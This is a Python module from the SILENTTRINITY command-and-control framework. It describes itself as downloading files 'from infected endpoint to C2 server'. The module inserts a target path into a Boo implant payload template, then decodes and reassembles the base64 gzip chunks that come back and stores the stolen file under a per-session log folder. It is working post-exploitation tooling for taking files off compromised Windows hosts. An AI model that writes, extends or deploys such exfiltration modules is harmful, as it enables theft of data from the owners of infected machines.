import gzip
import logging
import json
import ntpath
import os
from datetime import datetime
from base64 import b64decode
from silenttrinity.core.utils import get_path_in_data_folder, get_path_in_package
from silenttrinity.core.teamserver.module import Module


class STModule(Module):
    def __init__(self):
        self._new_dmp_file = True  # This sucks but its currently the only way to keep track if we want a new file

        self.name = 'boo/download'
        self.language = 'boo'
        self.description = 'Download file from infected endpoint to C2 server.\nFile will be saved to data/logs/(session)downloader_*'
        self.author = 'Tinydile'
        self.references = []
        self.options = {
            'Src': {
                'Description': 'The Path of the target file. Path delimiter is four backslashes',
                'Required': True,
                'Value': "C:\\\\tmp\\\\test.txt"
            }
        }

    def payload(self):
        with open(get_path_in_package('core/teamserver/modules/boo/src/downloader.boo'), 'r') as module_src:
            src = module_src.read()
            src = src.replace('SRCFILE_PATH', self.options['Src']['Value'])
            return src

    def process(self, context, output):
        if self._new_dmp_file == True:
            self._new_dmp_file = False
            self.fname = ntpath.basename(self.options['Src']['Value'])
            self.gzip_file = os.path.join(
                get_path_in_data_folder("logs"), 
                f"{context.session.guid}/downloader_{datetime.now().strftime('%Y_%m_%d_%H%M%S')}.gz"
            )
            self.decompressed_file = os.path.join(
                get_path_in_data_folder("logs"),
                f"{context.session.guid}/downloader_{datetime.now().strftime('%Y_%m_%d_%H%M%S')}_{self.fname}"
            )

        try:
            file_chunk = output['data']
            with open(self.gzip_file, 'ab+') as reassembled_gzip_file:
                reassembled_gzip_file.write(b64decode(file_chunk))

            if output['current_chunk_n'] == (output['chunk_n'] + 1):
                try:
                    with open(self.decompressed_file, 'wb') as reassembled_file:
                        with gzip.open(self.gzip_file) as compressed_file:
                            reassembled_file.write(compressed_file.read())
                    os.remove(self.gzip_file)
                except Exception as e:
                    logging.error(f"Error decompressing re-assembled file: {e}")

                self._new_dmp_file = True
                return

            else:
                return f"Processed chunk {output['current_chunk_n']}/{output['chunk_n'] + 1}"
        except TypeError:
            return output
